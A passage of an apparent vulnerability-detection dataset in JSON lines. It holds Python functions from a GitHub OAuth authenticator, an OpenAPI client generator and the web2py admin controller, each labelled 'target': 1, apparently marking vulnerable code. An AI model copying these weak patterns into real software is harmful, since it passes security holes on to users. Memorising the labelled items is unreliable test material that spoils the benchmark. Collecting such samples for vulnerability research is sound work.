self.log.warning(\"github_client_id is deprecated, use client_id\")\n        self.client_id = new\n\n    github_client_secret = Unicode(config=True, help=\"DEPRECATED\")\n\n    def _github_client_secret_changed(self, name, old, new):\n        self.log.warning(\"github_client_secret is deprecated, use client_secret\")\n        self.client_secret = new\n\n    client_id_env = 'GITHUB_CLIENT_ID'\n    client_secret_env = 'GITHUB_CLIENT_SECRET'\n\n    github_organization_whitelist = Set(help=\"Deprecated, use `GitHubOAuthenticator.allowed_organizations`\", config=True,)\n\n    allowed_organizations = Set(\n        config=True, help=\"Automatically allow members of selected organizations\"\n    )\n\n    async def authenticate(self, handler, data=None):\n        \"\"\"We set up auth_state based on additional GitHub info if we\n        receive it.\n        \"\"\"\n        code = handler.get_argument(\"code\")\n        # TODO: Configure the curl_httpclient for tornado\n        http_client = AsyncHTTPClient()\n\n        # Exchange the OAuth code for a GitHub Access Token\n        #\n        # See: https://developer.github.com/v3/oauth/\n\n        # GitHub specifies a POST request yet requires URL parameters\n        params = dict(\n            client_id=self.client_id, client_secret=self.client_secret, code=code\n        )\n\n        url = url_concat(self.token_url, params)\n\n        req = HTTPRequest(\n            url,\n            method=\"POST\",\n            headers={\"Accept\": \"application/json\"},\n            body='',  # Body is required for a POST...\n            validate_cert=self.validate_server_cert,\n        )\n\n        resp = await http_client.fetch(req)\n        resp_json = json.loads(resp.body.decode('utf8', 'replace'))\n\n        if 'access_token' in resp_json:\n            access_token = resp_json['access_token']\n        elif 'error_description' in resp_json:\n            raise HTTPError(\n                403,\n                \"An access token was not returned: {}\".format(\n                    resp_json['error_description']\n                ),\n            )\n        else:\n            raise HTTPError(500, \"Bad response: {}\".format(resp))\n\n        # Determine who the logged in user is\n        req = HTTPRequest(\n            self.github_api + \"/user\",\n            method=\"GET\",\n            headers=_api_headers(access_token),\n            validate_cert=self.validate_server_cert,\n        )\n        resp = await http_client.fetch(req)\n        resp_json = json.loads(resp.body.decode('utf8', 'replace'))\n\n        username = resp_json[\"login\"]\n        # username is now the GitHub userid.\n        if not username:\n            return None\n        # Check if user is a member of any allowed organizations.\n        # This check is performed here, as it requires `access_token`.\n        if self.allowed_organizations:\n            for org in self.allowed_organizations:\n                user_in_org = await self._check_membership_allowed_organizations(\n                    org, username, access_token\n                )\n                if user_in_org:\n                    break\n            else:  # User not found in member list for any organisation\n                self.log.warning(\"User %s is not in allowed org list\", username)\n                return None\n        userdict = {\"name\": username}\n        # Now we set up auth_state\n        userdict[\"auth_state\"] = auth_state = {}\n        # Save the access token and full GitHub reply (name, id, email) in auth state\n        # These can be used for user provisioning in the Lab/Notebook environment.\n        # e.g.\n        #  1) stash the access token\n        #  2) use the GitHub ID as the id\n        #  3) set up name/email for .gitconfig\n        auth_state['access_token'] = access_token\n        # store the whole user model in auth_state.github_user\n        auth_state['github_user'] = resp_json\n        # A public email will return in the initial query (assuming default scope).\n        # Private will not.\n\n        return userdict\n\n    async def _check_membership_allowed_organizations(self, org, username, access_token):\n        http_client = AsyncHTTPClient()\n        headers = _api_headers(access_token)\n        # Check membership of user `username` for organization `org` via api [check-membership](https://developer.github.com/v3/orgs/members/#check-membership)\n        # With empty scope (even if authenticated by an org member), this\n        #  will only await public org members.  You want 'read:org' in order\n        #  to be able to iterate through all members.\n        check_membership_url = \"%s/orgs/%s/members/%s\" % (\n            self.github_api,\n            org,\n            username,\n        )\n        req = HTTPRequest(\n            check_membership_url,\n            method=\"GET\",\n            headers=headers,\n            validate_cert=self.validate_server_cert,\n        )\n        self.log.debug(\n            \"Checking GitHub organization membership: %s in %s?\", username, org\n        )\n        resp = await http_client.fetch(req, raise_error=False)\n        print(resp)\n        if resp.code == 204:\n            self.log.info(\"Allowing %s as member of %s\", username, org)\n            return True\n        else:\n            try:\n                resp_json = json.loads((resp.body or b'').decode('utf8', 'replace'))\n                message = resp_json.get('message', '')\n            except ValueError:\n                message = ''\n            self.log.debug(\n                \"%s does not appear to be a member of %s (status=%s): %s\",\n                username,\n                org,\n                resp.code,\n                message,\n            )\n        return False\n\n\nclass LocalGitHubOAuthenticator(LocalAuthenticator, GitHubOAuthenticator):\n\n    \"\"\"A version that mixes in local system user creation\"\"\"\n\n    pass\n", "target": 1}
{"idx": 973, "func": "\"\"\" Generate modern Python clients from OpenAPI \"\"\"\nfrom __future__ import annotations\n\nimport shutil\nimport subprocess\nimport sys\nfrom pathlib import Path\nfrom typing import Any, Dict, Optional, Sequence, Union\n\nimport httpcore\nimport httpx\nimport yaml\nfrom jinja2 import Environment, PackageLoader\n\nfrom openapi_python_client import utils\n\nfrom .parser import GeneratorData, import_string_from_reference\nfrom .parser.errors import GeneratorError\n\nif sys.version_info.minor == 7:  # version did not exist in 3.7, need to use a backport\n    from importlib_metadata import version\nelse:\n    from importlib.metadata import version  # type: ignore\n\n\n__version__ = version(__package__)\n\n\ndef _get_project_for_url_or_path(url: Optional[str], path: Optional[Path]) -> Union[Project, GeneratorError]:\n    data_dict = _get_document(url=url, path=path)\n    if isinstance(data_dict, GeneratorError):\n        return data_dict\n    openapi = GeneratorData.from_dict(data_dict)\n    if isinstance(openapi, GeneratorError):\n        return openapi\n    return Project(openapi=openapi)\n\n\ndef create_new_client(*, url: Optional[str], path: Optional[Path]) -> Sequence[GeneratorError]:\n    \"\"\"\n    Generate the client library\n\n    Returns:\n         A list containing any errors encountered when generating.\n    \"\"\"\n    project = _get_project_for_url_or_path(url=url, path=path)\n    if isinstance(project, GeneratorError):\n        return [project]\n    return project.build()\n\n\ndef update_existing_client(*, url: Optional[str], path: Optional[Path]) -> Sequence[GeneratorError]:\n    \"\"\"\n    Update an existing client library\n\n    Returns:\n         A list containing any errors encountered when generating.\n    \"\"\"\n    project = _get_project_for_url_or_path(url=url, path=path)\n    if isinstance(project, GeneratorError):\n        return [project]\n    return project.update()\n\n\ndef _get_document(*, url: Optional[str], path: Optional[Path]) -> Union[Dict[str, Any], GeneratorError]:\n    yaml_bytes: bytes\n    if url is not None and path is not None:\n        return GeneratorError(header=\"Provide URL or Path, not both.\")\n    if url is not None:\n        try:\n            response = httpx.get(url)\n            yaml_bytes = response.content\n        except (httpx.HTTPError, httpcore.NetworkError):\n            return GeneratorError(header=\"Could not get OpenAPI document from provided URL\")\n    elif path is not None:\n        yaml_bytes = path.read_bytes()\n    else:\n        return GeneratorError(header=\"No URL or Path provided\")\n    try:\n        return yaml.safe_load(yaml_bytes)\n    except yaml.YAMLError:\n        return GeneratorError(header=\"Invalid YAML from provided source\")\n\n\nclass Project:\n    TEMPLATE_FILTERS = {\"snakecase\": utils.snake_case, \"spinalcase\": utils.spinal_case}\n    project_name_override: Optional[str] = None\n    package_name_override: Optional[str] = None\n\n    def __init__(self, *, openapi: GeneratorData) -> None:\n        self.openapi: GeneratorData = openapi\n        self.env: Environment = Environment(loader=PackageLoader(__package__), trim_blocks=True, lstrip_blocks=True)\n\n        self.project_name: str = self.project_name_override or f\"{openapi.title.replace(' ', '-').lower()}-client\"\n        self.project_dir: Path = Path.cwd() / self.project_name\n\n        self.package_name: str = self.package_name_override or self.project_name.replace(\"-\", \"_\")\n        self.package_dir: Path = self.project_dir / self.package_name\n        self.package_description: str = f\"A client library for accessing {self.openapi.title}\"\n        self.version: str = openapi.version\n\n        self.env.filters.update(self.TEMPLATE_FILTERS)\n\n    def build(self) -> Sequence[GeneratorError]:\n        \"\"\" Create the project from templates \"\"\"\n\n        print(f\"Generating {self.project_name}\")\n        try:\n            self.project_dir.mkdir()\n        except FileExistsError:\n            return [GeneratorError(detail=\"Directory already exists. Delete it or use the update command.\")]\n        self._create_package()\n        self._build_metadata()\n        self._build_models()\n        self._build_api()\n        self._reformat()\n        return self._get_errors()\n\n    def update(self) -> Sequence[GeneratorError]:\n        \"\"\" Update an existing project \"\"\"\n\n        if not self.package_dir.is_dir():\n            raise FileNotFoundError()\n        print(f\"Updating {self.project_name}\")\n        shutil.rmtree(self.package_dir)\n        self._create_package()\n        self._build_models()\n        self._build_api()\n        self._reformat()\n        return self._get_errors()\n\n    def _reformat(self) -> None:\n        subprocess.run(\n            \"isort .\", cwd=self.project_dir, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,\n        )\n        subprocess.run(\"black .\", cwd=self.project_dir, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n\n    def _get_errors(self) -> Sequence[GeneratorError]:\n        errors = []\n        for collection in self.openapi.endpoint_collections_by_tag.values():\n            errors.extend(collection.parse_errors)\n        errors.extend(self.openapi.schemas.errors)\n        return errors\n\n    def _create_package(self) -> None:\n        self.package_dir.mkdir()\n        # Package __init__.py\n        package_init = self.package_dir / \"__init__.py\"\n\n        package_init_template = self.env.get_template(\"package_init.pyi\")\n        package_init.write_text(package_init_template.render(description=self.package_description))\n\n        pytyped = self.package_dir / \"py.typed\"\n        pytyped.write_text(\"# Marker file for PEP 561\")\n\n    def _build_metadata(self) -> None:\n        # Create a pyproject.toml file\n        pyproject_template = self.env.get_template(\"pyproject.toml\")\n        pyproject_path = self.project_dir / \"pyproject.toml\"\n        pyproject_path.write_text(\n            pyproject_template.render(\n                project_name=self.project_name,\n                package_name=self.package_name,\n                version=self.version,\n                description=self.package_description,\n            )\n        )\n\n        # README.md\n        readme = self.project_dir / \"README.md\"\n        readme_template = self.env.get_template(\"README.md\")\n        readme.write_text(\n            readme_template.render(\n                project_name=self.project_name, description=self.package_description, package_name=self.package_name\n            )\n        )\n\n        # .gitignore\n        git_ignore_path = self.project_dir / \".gitignore\"\n        git_ignore_template = self.env.get_template(\".gitignore\")\n        git_ignore_path.write_text(git_ignore_template.render())\n\n    def _build_models(self) -> None:\n        # Generate models\n        models_dir = self.package_dir / \"models\"\n        models_dir.mkdir()\n        models_init = models_dir / \"__init__.py\"\n        imports = []\n\n        types_template = self.env.get_template(\"types.py\")\n        types_path = models_dir / \"types.py\"\n        types_path.write_text(types_template.render())\n\n        model_template = self.env.get_template(\"model.pyi\")\n        for model in self.openapi.schemas.models.values():\n            module_path = models_dir / f\"{model.reference.module_name}.py\"\n            module_path.write_text(model_template.render(model=model))\n            imports.append(import_string_from_reference(model.reference))\n\n        # Generate enums\n        enum_template = self.env.get_template(\"enum.pyi\")\n        for enum in self.openapi.enums.values():\n            module_path = models_dir / f\"{enum.reference.module_name}.py\"\n            module_path.write_text(enum_template.render(enum=enum))\n            imports.append(import_string_from_reference(enum.reference))\n\n        models_init_template = self.env.get_template(\"models_init.pyi\")\n        models_init.write_text(models_init_template.render(imports=imports))\n\n    def _build_api(self) -> None:\n        # Generate Client\n        client_path = self.package_dir / \"client.py\"\n        client_template = self.env.get_template(\"client.pyi\")\n        client_path.write_text(client_template.render())\n\n        # Generate endpoints\n        api_dir = self.package_dir / \"api\"\n        api_dir.mkdir()\n        api_init = api_dir / \"__init__.py\"\n        api_init.write_text('\"\"\" Contains synchronous methods for accessing the API \"\"\"')\n\n        async_api_dir = self.package_dir / \"async_api\"\n        async_api_dir.mkdir()\n        async_api_init = async_api_dir / \"__init__.py\"\n        async_api_init.write_text('\"\"\" Contains async methods for accessing the API \"\"\"')\n\n        api_errors = self.package_dir / \"errors.py\"\n        errors_template = self.env.get_template(\"errors.pyi\")\n        api_errors.write_text(errors_template.render())\n\n        endpoint_template = self.env.get_template(\"endpoint_module.pyi\")\n        async_endpoint_template = self.env.get_template(\"async_endpoint_module.pyi\")\n        for tag, collection in self.openapi.endpoint_collections_by_tag.items():\n            module_path = api_dir / f\"{tag}.py\"\n            module_path.write_text(endpoint_template.render(collection=collection))\n            async_module_path = async_api_dir / f\"{tag}.py\"\n            async_module_path.write_text(async_endpoint_template.render(collection=collection))\n", "target": 1}
{"idx": 974, "func": "# -*- coding: utf-8 -*-\n\nEXPERIMENTAL_STUFF = True\nMAXNFILES = 1000\n\nif EXPERIMENTAL_STUFF:\n    if is_mobile:\n        response.view = response.view.replace('default/', 'default.mobile/')\n        response.menu = []\n\nimport re\nfrom gluon.admin import *\nfrom gluon.fileutils import abspath, read_file, write_file\nfrom gluon.utils import web2py_uuid\nfrom gluon.tools import Config\nfrom gluon.compileapp import find_exposed_functions\nfrom glob import glob\nimport shutil\nimport platform\n\ntry:\n    import git\n    if git.__version__ < '0.3.1':\n        raise ImportError(\"Your version of git is %s. Upgrade to 0.3.1 or better.\" % git.__version__)\n    have_git = True\nexcept ImportError, e:\n    have_git = False\n    GIT_MISSING = 'Requires gitpython module, but not installed or incompatible version: %s' % e\n\nfrom gluon.languages import (read_possible_languages, read_dict, write_dict,\n                             read_plural_dict, write_plural_dict)\n\n\nif DEMO_MODE and request.function in ['change_password', 'pack',\n                                      'pack_custom', 'pack_plugin', 'upgrade_web2py', 'uninstall',\n                                      'cleanup', 'compile_app', 'remove_compiled_app', 'delete',\n                                      'delete_plugin', 'create_file', 'upload_file', 'update_languages',\n                                      'reload_routes', 'git_push', 'git_pull', 'install_plugin']:\n    session.flash = T('disabled in demo mode')\n    redirect(URL('site'))\n\nif is_gae and request.function in ('edit', 'edit_language',\n                                   'edit_plurals', 'update_languages', 'create_file', 'install_plugin'):\n    session.flash = T('disabled in GAE mode')\n    redirect(URL('site'))\n\nif not is_manager() and request.function in ['change_password', 'upgrade_web2py']:\n    session.flash = T('disabled in multi user mode')\n    redirect(URL('site'))\n\nif FILTER_APPS and request.args(0) and not request.args(0) in FILTER_APPS:\n    session.flash = T('disabled in demo mode')\n    redirect(URL('site'))\n\n\nif not session.token:\n    session.token = web2py_uuid()\n\n\ndef count_lines(data):\n    return len([line for line in data.split('\\n') if line.strip() and not line.startswith('#')])\n\n\ndef log_progress(app, mode='EDIT', filename=None, progress=0):\n    progress_file = os.path.join(apath(app, r=request), 'progress.log')\n    now = str(request.now)[:19]\n    if not os.path.exists(progress_file):\n        safe_open(progress_file, 'w').write('[%s] START\\n' % now)\n    if filename:\n        safe_open(progress_file, 'a').write(\n            '[%s] %s %s: %s\\n' % (now, mode, filename, progress))\n\n\ndef safe_open(a, b):\n    if (DEMO_MODE or is_gae) and ('w' in b or 'a' in b):\n        class tmp:\n\n            def write(self, data):\n                pass\n\n            def close(self):\n                pass\n        return tmp()\n    return open(a, b)\n\n\ndef safe_read(a, b='r'):\n    safe_file = safe_open(a, b)\n    try:\n        return safe_file.read()\n    finally:\n        safe_file.close()\n\n\ndef safe_write(a, value, b='w'):\n    safe_file = safe_open(a, b)\n    try:\n        safe_file.write(value)\n    finally:\n        safe_file.close()\n\n\ndef get_app(name=None):\n    app = name or request.args(0)\n    if (app and os.path.exists(apath(app, r=request)) and\n        (not MULTI_USER_MODE or is_manager() or\n         db(db.app.name == app)(db.app.owner == auth.user.id).count())):\n        return app\n    session.flash = T('App does not exist or you are not authorized')\n    redirect(URL('site'))\n\n\ndef index():\n    \"\"\" Index handler \"\"\"\n\n    send = request.vars.send\n    if DEMO_MODE:\n        session.authorized = True\n        session.last_time = t0\n    if not send:\n        send = URL('site')\n    if session.authorized:\n        redirect(send)\n    elif request.vars.password:\n        if verify_password(request.vars.password[:1024]):\n            session.authorized = True\n            login_record(True)\n\n            if CHECK_VERSION:\n                session.check_version = True\n            else:\n                session.check_version = False\n\n            session.last_time = t0\n            if isinstance(send, list):  # ## why does this happen?\n                send = str(send[0])\n\n            redirect(send)\n        else:\n            times_denied = login_record(False)\n            if times_denied >= allowed_number_of_attempts:\n                response.flash = \\\n                    T('admin disabled because too many invalid login attempts')\n            elif times_denied == allowed_number_of_attempts - 1:\n                response.flash = \\\n                    T('You have one more login attempt before you are locked out')\n            else:\n                response.flash = T('invalid password.')\n    return dict(send=send)\n\n\ndef check_version():\n    \"\"\" Checks if web2py is up to date \"\"\"\n\n    session.forget()\n    session._unlock(response)\n\n    new_version, version = check_new_version(request.env.web2py_version,\n                                             WEB2PY_VERSION_URL)\n\n    if new_version == -1:\n        return A(T('Unable to check for upgrades'), _href=WEB2PY_URL)\n    elif new_version != True:\n        return A(T('web2py is up to date'), _href=WEB2PY_URL)\n    elif platform.system().lower() in ('windows', 'win32', 'win64') and os.path.exists(\"web2py.exe\"):\n        return SPAN('You should upgrade to %s' % version.split('(')[0])\n    else:\n        return sp_button(URL('upgrade_web2py'), T('upgrade now to %s') % version.split('(')[0])\n\n\ndef logout():\n    \"\"\" Logout handler \"\"\"\n    session.authorized = None\n    if MULTI_USER_MODE:\n        redirect(URL('user/logout'))\n    redirect(URL('index'))\n\n\ndef change_password():\n\n    if session.pam_user:\n        session.flash = T(\n            'PAM authenticated user, cannot change password here')\n        redirect(URL('site'))\n    form = SQLFORM.factory(Field('current_admin_password', 'password'),\n                           Field('new_admin_password',\n                                 'password', requires=IS_STRONG()),\n                           Field('new_admin_password_again', 'password'),\n                           _class=\"span4 well\")\n    if form.accepts(request.vars):\n        if not verify_password(request.vars.current_admin_password):\n            form.errors.current_admin_password = T('invalid password')\n        elif form.vars.new_admin_password != form.vars.new_admin_password_again:\n            form.errors.new_admin_password_again = T('no match')\n        else:\n            path = abspath('parameters_%s.py' % request.env.server_port)\n            safe_write(path, 'password=\"%s\"' % CRYPT()(\n                request.vars.new_admin_password)[0])\n            session.flash = T('password changed')\n            redirect(URL('site'))\n    return dict(form=form)\n\n\ndef site():\n    \"\"\" Site handler \"\"\"\n\n    myversion = request.env.web2py_version\n\n    # Shortcut to make the elif statements more legible\n    file_or_appurl = 'file' in request.vars or 'appurl' in request.vars\n\n    class IS_VALID_APPNAME(object):\n\n        def __call__(self, value):\n            if not re.compile('^\\w+$').match(value):\n                return (value, T('Invalid application name'))\n            if not request.vars.overwrite and \\\n                    os.path.exists(os.path.join(apath(r=request), value)):\n                return (value, T('Application exists already'))\n            return (value, None)\n\n    is_appname = IS_VALID_APPNAME()\n    form_create = SQLFORM.factory(Field('name', requires=is_appname),\n                                  table_name='appcreate')\n    form_update = SQLFORM.factory(Field('name', requires=is_appname),\n                                  Field('file', 'upload', uploadfield=False),\n                                  Field('url'),\n                                  Field('overwrite', 'boolean'),\n                                  table_name='appupdate')\n    form_create.process()\n    form_update.process()\n\n    if DEMO_MODE:\n        pass\n\n    elif form_create.accepted:\n        # create a new application\n        appname = cleanpath(form_create.vars.name)\n        created, error = app_create(appname, request, info=True)\n        if created:\n            if MULTI_USER_MODE:\n                db.app.insert(name=appname, owner=auth.user.id)\n            log_progress(appname)\n            session.flash = T('new application \"%s\" created', appname)\n            redirect(URL('design', args=appname))\n        else:\n            session.flash = \\\n                DIV(T('unable to create application \"%s\"', appname),\n                    PRE(error))\n        redirect(URL(r=request))\n\n    elif form_update.accepted:\n        if (form_update.vars.url or '').endswith('.git'):\n            if not have_git:\n                session.flash = GIT_MISSING\n                redirect(URL(r=request))\n            target = os.path.join(apath(r=request), form_update.vars.name)\n            try:\n                new_repo = git.Repo.clone_from(form_update.vars.url, target)\n                session.flash = T('new application \"%s\" imported',\n                                  form_update.vars.name)\n            except git.GitCommandError, err:\n                session.flash = T('Invalid git repository specified.')\n            redirect(URL(r=request))\n\n        elif form_update.vars.url:\n            # fetch an application via URL or file upload\n            try:\n                f = urllib.urlopen(form_update.vars.url)\n                if f.code == 404:\n                    raise Exception(\"404 file not found\")\n            except Exception, e:\n                session.flash = \\\n                    DIV(T('Unable to download app because:'), PRE(repr(e)))\n                redirect(URL(r=request))\n            fname = form_update.vars.url\n\n        elif form_update.accepted and form_update.vars.file:\n            fname = request.vars.file.filename\n            f = request.vars.file.file\n\n        else:\n            session.flash = 'No file uploaded and no URL specified'\n            redirect(URL(r=request))\n\n        if f:\n            appname = cleanpath(form_update.vars.name)\n            installed = app_install(appname, f,\n                                    request, fname,\n                                    overwrite=form_update.vars.overwrite)\n        if f and installed:\n            msg = 'application %(appname)s installed with md5sum: %(digest)s'\n            if MULTI_USER_MODE:\n                db.app.insert(name=appname, owner=auth.user.id)\n            log_progress(appname)\n            session.flash = T(msg, dict(appname=appname,\n                                        digest=md5_hash(installed)))\n        else:\n            msg = 'unable to install application \"%(appname)s\"'\n            session.flash = T(msg, dict(appname=form_update.vars.name))\n        redirect(URL(r=request))\n\n    regex = re.compile('^\\w+$')\n\n    if is_manager():\n        apps = [f for f in os.listdir(apath(r=request)) if regex.match(f)]\n    else:\n        apps = [f.name for f in db(db.app.owner == auth.user_id).select()]\n\n    if FILTER_APPS:\n        apps = [f for f in apps if f in FILTER_APPS]\n\n    apps = sorted(apps, lambda a, b: cmp(a.upper(), b.upper()))\n    myplatform = platform.python_version()\n    return dict(app=None, apps=apps, myversion=myversion, myplatform=myplatform,\n                form_create=form_create, form_update=form_update)\n\n\ndef report_progress(app):\n    import datetime\n    progress_file = os.path.join(apath(app, r=request), 'progress.log')\n    regex = re.compile('\\[(.*?)\\][^\\:]+\\:\\s+(\\-?\\d+)')\n    if not os.path.exists(progress_file):\n        return []\n    matches = regex.findall(open(progress_file, 'r').read())\n    events, counter = [], 0\n    for m in matches:\n        if not m:\n            continue\n        days = -(request.now - datetime.datetime.strptime(m[0],\n                                                          '%Y-%m-%d %H:%M:%S')).days\n        counter += int(m[1])\n        events.append([days, counter])\n    return events\n\n\ndef pack():\n    app = get_app()\n\n    try:\n        if len(request.args) == 1:\n            fname = 'web2py.app.%s.w2p' % app\n            filename = app_pack(app, request, raise_ex=True)\n        else:\n            fname = 'web2py.app.%s.compiled.w2p' % app\n            filename = app_pack_compiled(app, request, raise_ex=True)\n    except Exception, e:\n        filename = None\n\n    if filename:\n        response.headers['Content-Type'] = 'application/w2p'\n        disposition = 'attachment; filename=%s' % fname\n        response.headers['Content-Disposition'] = disposition\n        return safe_read(filename, 'rb')\n    else:\n        session.flash = T('internal error: %s', e)\n        redirect(URL('site'))\n\n\ndef pack_plugin():\n    app = get_app()\n    if len(request.args) == 2:\n        fname = 'web2py.plugin.%s.w2p' % request.args[1]\n        filename = plugin_pack(app, request.args[1], request)\n    if filename:\n        response.headers['Content-Type'] = 'application/w2p'\n        disposition = 'attachment; filename=%s' % fname\n        response.headers['Content-Disposition'] = disposition\n        return safe_read(filename, 'rb')\n    else:\n        session.flash = T('internal error')\n        redirect(URL('plugin', args=request.args))\n\n\ndef pack_exe(app, base, filenames=None):\n    import urllib\n    import zipfile\n    from cStringIO import StringIO\n    # Download latest web2py_win and open it with zipfile\n    download_url = 'http://www.web2py.com/examples/static/web2py_win.zip'\n    out = StringIO()\n    out.write(urllib.urlopen(download_url).read())\n    web2py_win = zipfile.ZipFile(out, mode='a')\n    # Write routes.py with the application as default\n    routes = u'# -*- coding: utf-8 -*-\\nrouters = dict(BASE=dict(default_application=\"%s\"))' % app\n    web2py_win.writestr('web2py/routes.py', routes.encode('utf-8'))\n    # Copy the application into the zipfile\n    common_root = os.path.dirname(base)\n    for filename in filenames:\n        fname = os.path.join(base, filename)\n        arcname = os.path.join('web2py/applications', app, filename)\n        web2py_win.write(fname, arcname)\n    web2py_win.close()\n    response.headers['Content-Type'] = 'application/zip'\n    response.headers['Content-Disposition'] = 'attachment; filename=web2py.app.%s.zip' % app\n    out.seek(0)\n    return response.stream(out)\n\n\ndef pack_custom():\n    app = get_app()\n    base = apath(app, r=request)\n\n    def ignore(fs):\n        return [f for f in fs if not (\n                f[:1] in '#' or f.endswith('~') or f.endswith('.bak'))]\n    files = {}\n    for (r, d, f) in os.walk(base):\n        files[r] = {'folders': ignore(d), 'files': ignore(f)}\n\n    if request.post_vars.file:\n        valid_set = set(os.path.relpath(os.path.join(r, f), base) for r in files for f in files[r]['files'])\n        files = request.post_vars.file\n        files = [files] if not isinstance(files, list) else files\n        files = [file for file in files if file in valid_set]\n\n        if request.post_vars.doexe is None:\n            fname = 'web2py.app.%s.w2p' % app\n            try:\n                filename = app_pack(app, request, raise_ex=True, filenames=files)\n            except Exception, e:\n                filename = None\n            if filename:\n                response.headers['Content-Type'] = 'application/w2p'\n                disposition = 'attachment; filename=%s' % fname\n                response.headers['Content-Disposition'] = disposition\n                return safe_read(filename, 'rb')\n            else:\n                session.flash = T('internal error: %s', e)\n                redirect(URL(args=request.args))\n        else:\n            return pack_exe(app, base, files)\n\n    return locals()\n\n\ndef upgrade_web2py():\n    dialog = FORM.confirm(T('Upgrade'),\n                          {T('Cancel'): URL('site')})\n    if dialog.accepted:\n        (success, error) = upgrade(request)\n        if success:\n            session.flash = T('web2py upgraded; please restart it')\n        else:\n            session.flash = T('unable to upgrade because \"%s\"', error)\n        redirect(URL('site'))\n    return dict(dialog=dialog)\n\n\ndef uninstall():\n    app = get_app()\n\n    dialog = FORM.confirm(T('Uninstall'),\n                          {T('Cancel'): URL('site')})\n    dialog['_id'] = 'confirm_form'\n    dialog['_class'] = 'well'\n    for component in dialog.components:\n        component['_class'] = 'btn'\n\n    if dialog.accepted:\n        if MULTI_USER_MODE:\n            if is_manager() and db(db.app.name == app).delete():\n                pass\n            elif db(db.app.name == app)(db.app.owner == auth.user.id).delete():\n                pass\n            else:\n                session.flash = T('no permission to uninstall \"%s\"', app)\n                redirect(URL('site'))\n        try:\n            filename = app_pack(app, request, raise_ex=True)\n        except:\n            session.flash = T('unable to uninstall \"%s\"', app)\n        else:\n            if app_uninstall(app, request):\n                session.flash = T('application \"%s\" uninstalled', app)\n            else:\n                session.flash = T('unable to uninstall \"%s\"', app)\n        redirect(URL('site'))\n    return dict(app=app, dialog=dialog)\n\n\ndef cleanup():\n    app = get_app()\n    clean = app_cleanup(app, request)\n    if not clean:\n        session.flash = T(\"some files could not be removed\")\n    else:\n        session.flash = T('cache, errors and sessions cleaned')\n\n    redirect(URL('site'))\n\n\ndef compile_app():\n    app = get_app()\n    c = app_compile(app, request,\n                    skip_failed_views=(request.args(1) == 'skip_failed_views'))\n    if not c:\n        session.flash = T('application compiled')\n    elif isinstance(c, list):\n        session.flash = DIV(*[T('application compiled'), BR(), BR(),\n                              T('WARNING: The following views could not be compiled:'), BR()] +\n                            [CAT(BR(), view) for view in c] +\n                            [BR(), BR(), T('DO NOT use the \"Pack compiled\" feature.')])\n    else:\n        session.flash = DIV(T('Cannot compile: there are errors in your app:'),\n                            CODE(c))\n    redirect(URL('site'))\n\n\ndef remove_compiled_app():\n    \"\"\" Remove the compiled application \"\"\"\n    app = get_app()\n    remove_compiled_application(apath(app, r=request))\n    session.flash = T('compiled application removed')\n    redirect(URL('site'))\n\n\ndef delete():\n    \"\"\" Object delete handler \"\"\"\n    app = get_app()\n    filename = '/'.join(request.args)\n    sender = request.vars.sender\n\n    if isinstance(sender, list):  # ## fix a problem with Vista\n        sender = sender[0]\n\n    dialog = FORM.confirm(T('Delete'),\n                          {T('Cancel'): URL(sender, anchor=request.vars.id)})\n\n    if dialog.accepted:\n        try:\n            full_path = apath(filename, r=request)\n            lineno = count_lines(open(full_path, 'r').read())\n            os.unlink(full_path)\n            log_progress(app, 'DELETE', filename, progress=-lineno)\n            session.flash = T('file \"%(filename)s\" deleted',\n                              dict(filename=filename))\n        except Exception:\n            session.flash = T('unable to delete file \"%(filename)s\"',\n                              dict(filename=filename))\n        redirect(URL(sender, anchor=request.vars.id2))\n    return dict(dialog=dialog, filename=filename)\n\ndef enable():\n    if not URL.verify(request, hmac_key=session.hmac_key): raise HTTP(401)\n    app = get_app()\n    filename = os.path.join(apath(app, r=request), 'DISABLED')\n    if is_gae:\n        return SPAN(T('Not supported'), _style='color:yellow')\n    elif os.path.exists(filename):\n        os.unlink(filename)\n        return SPAN(T('Disable'), _style='color:green')\n    else:\n        safe_open(filename, 'wb').write('disabled: True\\ntime-disabled: %s' % request.now)\n        return SPAN(T('Enable'), _style='color:red')\n\n\ndef peek():\n    \"\"\" Visualize object code \"\"\"\n    app = get_app(request.vars.app)\n    filename = '/'.join(request.args)\n    if request.vars.app:\n        path = abspath(filename)\n    else:\n        path = apath(filename, r=request)\n    try:\n        data = safe_read(path).replace('\\r', '')\n    except IOError:\n        session.flash = T('file does not exist')\n        redirect(URL('site'))\n\n    extension = filename[filename.rfind('.') + 1:].lower()\n\n    return dict(app=app,\n                filename=filename,\n                data=data,\n                extension=extension)\n\n\ndef test():\n    \"\"\" Execute controller tests \"\"\"\n    app = get_app()\n    if len(request.args) > 1:\n        file = request.args[1]\n    else:\n        file = '.*\\.py'\n\n    controllers = listdir(\n        apath('%s/controllers/' % app, r=request), file + '$')\n\n    return dict(app=app, controllers=controllers)\n\n\ndef keepalive():\n    return ''\n\n\ndef search():\n    keywords = request.vars.keywords or ''\n    app = get_app()\n\n    def match(filename, keywords):\n        filename = os.path.join(apath(app, r=request), filename)\n        if keywords in read_file(filename, 'rb'):\n            return True\n        return False\n    path = apath(request.args[0], r=request)\n    files1 = glob(os.path.join(path, '*/*.py'))\n    files2 = glob(os.path.join(path, '*/*.html'))\n    files3 = glob(os.path.join(path, '*/*/*.html'))\n    files = [x[len(path) + 1:].replace(\n        '\\\\', '/') for x in files1 + files2 + files3 if match(x, keywords)]\n    return response.json(dict(files=files, message=T.M('Searching: **%s** %%{file}', len(files))))\n\n\ndef edit():\n    \"\"\" File edit handler \"\"\"\n    # Load json only if it is ajax edited...\n    app = get_app(request.vars.app)\n    app_path = apath(app, r=request)\n    preferences = {'theme': 'web2py', 'editor': 'default', 'closetag': 'true', 'codefolding': 'false', 'tabwidth': '4', 'indentwithtabs': 'false', 'linenumbers': 'true', 'highlightline': 'true'}\n    config = Config(os.path.join(request.folder, 'settings.cfg'),\n                    section='editor', default_values={})\n    preferences.update(config.read())\n\n    if not(request.ajax) and not(is_mobile):\n        # return the scaffolding, the rest will be through ajax requests\n        response.title = T('Editing %s') % app\n        return response.render('default/edit.html', dict(app=app, editor_settings=preferences))\n\n    # show settings tab and save prefernces\n    if 'settings' in request.vars:\n        if request.post_vars:  # save new preferences\n            post_vars = request.post_vars.items()\n            # Since unchecked checkbox are not serialized, we must set them as false by hand to store the correct preference in the settings\n            post_vars += [(opt, 'false') for opt in preferences if opt not in request.post_vars]\n            if 